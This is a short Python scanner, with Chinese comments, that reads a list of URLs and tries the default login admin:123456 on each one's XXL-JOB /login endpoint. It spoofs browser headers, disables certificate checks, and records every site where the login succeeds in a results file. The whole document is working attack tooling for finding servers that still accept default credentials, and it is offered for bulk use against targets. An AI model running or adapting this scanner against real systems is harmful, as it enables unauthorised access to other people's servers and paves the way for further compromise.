# 第一版 检测一个地址
import textwrap
import requests
import argparse
import sys
import json
def check(url):
    full_url = f'{url}/login'
    headers = {"Sec-Ch-Ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
                     "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                     "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://13.229.220.152",
                     "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
                     "Referer": "https://13.229.220.152/toLogin", "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "zh-CN,zh;q=0.9"}
    data = {"userName": "admin", "password": "123456"}
    try:
        response = requests.post(full_url, headers=headers, data=data, timeout=5, verify=False, allow_redirects=False)
    except Exception:
        print(f"[-]{url} 请求失败")
        return False
    if '{"code"' not in response.text: #判断是否为xxl_job
        return False
    data1 = json.loads(response.text)
    if data1.get('code') == 200 and data1.get('msg') == None:
        print(f"[+]{url} 存在默认口令 admin:123456")
        with open("resurlt.txt",mode='a',encoding='u8') as f:
            f.write(url+'\n')
    else:
        print(f"[-]{url} 不存在默认口令")
        return False
if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="若口令检测",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
    exp>python3 弱口令检测.py -f url.txt
                                             ''')
                                     )
    parser.add_argument('-f',"--file",dest="file", type=argparse.FileType(mode='r', encoding='u8'),help="input filename")
    args = parser.parse_args()

    with args.file as file:
        res = file.readlines()
    for url in res:
        url = url.strip()
        if check(url) == False:
            continue
